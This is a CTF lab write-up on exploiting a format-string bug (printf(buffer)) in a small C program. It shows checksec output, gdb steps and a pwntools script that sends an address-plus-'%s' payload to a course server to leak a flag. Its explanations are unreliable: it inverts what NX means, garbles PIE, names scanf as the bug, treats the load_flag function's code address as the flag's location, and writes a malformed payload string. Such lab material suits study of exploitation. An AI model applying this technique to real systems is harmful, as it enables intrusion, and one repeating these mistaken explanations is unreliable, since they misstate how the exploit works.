# CTF Challenge 1

## Description

A Zip file is provided, that contains an executable (**<span style="color:salmon">program</span>**) and source code (**<span style="color:salmon">main.c</span>**). The flag is found in the file **<span style="color:salmon">file.txt</span>** that is read by the program. (The flag in the Zip is a dummy, the valid one can be found in the server...) Besides this, a script file is provided to aid in the development of the exploit, with some explanations on how to use along with gdb.

### Tasks

- You should start by running **<span style="color:salmon">checksec</span>**. Contrary to last time, this program has some active protections. You should figure out what these are and what attacks are possible.




## Solution

#### Runnning

> checksec --file=program --output=json | jq

`make sure checksec and jq are installed`
#### Output:

```json
{
  "program": {
    "relro": "partial",
    "canary": "yes",
    "nx": "yes",
    "pie": "no",
    "rpath": "no",
    "runpath": "no",
    "symbols": "yes",
    "fortify_source": "yes",
    "fortified": "0",
    "fortify-able": "2"
  }
}
```
#### Meaning:

- RELRO is partially enable, so this security property makes the GOT within the binary read-only, preventing some form of relocation attacks.
- Canary found, so there are values placed between a buffer and control data on the stack to monitor buffer overflows.
- No PIE, so no position-independent executable meaning that there is no code place somewhere in the memory for execution regardless of its absolute address.
- NX enabled, there's not a mark in certain areas of memory as non-executable, so that can't prevent buffer-overflow exploits

- Because of NO PIE we may be able to perform a string format in case of a **scanf** present in the main code.

#### Main Code:

```c
#include <stdio.h>
#include <stdlib.h>

#define FLAG_BUFFER_SIZE 40

char flag[FLAG_BUFFER_SIZE];

void load_flag(){
    FILE *fd = fopen("flag.txt","r");

    if(fd != NULL) {
        fgets(flag, FLAG_BUFFER_SIZE, fd);
    }
}

int main() {

    load_flag();
   
    char buffer[32];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%32s", &buffer);
    printf("You gave me this: ");
    printf(buffer);

    if(0) {
        printf("I like what you got!\n%s\n", flag);
    } else {
        printf("\nDisqualified!\n");
    }
    fflush(stdout);
    
    
    return 0;
}
```

### Vulnerabilities

> scanf("%32s", &buffer);
- Since this exist we can input our string.

> load_flag();
- This function opens the file **"flag.txt"** in read mode, so if we can run it, we might be able to read its content and get the flag

### Exploit Procedure

##### We run:

> gdb program

- After we can find where flag is and since PIE is off, its address won't change when accessed again:

> gdb-peda$ p load_flag

- Using the function shown in main.c we get the following output:

> $1 = {void ()} 0x8049256 <load_flag>

Telling us that the flag is stored in 0x8049256, so that's the address we want to exploit. In the file *exploit_example.py* we have:

```python
from pwn import *

LOCAL = True

if LOCAL:
    p = process("./program")
    """
    pause() stops the script allows for the use of gdb to attach to process
    In order to attach to the process you have to obtain the pid of the proccess through the output of this program.
    (Exemple: Starting local process './program': pid 9717 - O pid would be 9717) 
    Then run gdb in order to give attach
    (Exemple: `$ gdb attach 9717` )
    Attaching to the process, the gdb, the program stops at the instruction that was running.
    To continue the execution of the program you should send the command "continue" e in gdb and press enter on the script of the exploit.
    """
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4004)

p.recvuntil(b"got:")
p.sendline(b"oi")
p.interactive()
```

- Now in the p.sendline() we inject our desired address:
> p.sendline("x56\x92\x04\x08-%s")

- All that's left to do is execute the **exploit_example.py** in order to obtain the flag. 

> python3 exploit_example.py

`make sure pwntools library is installed`


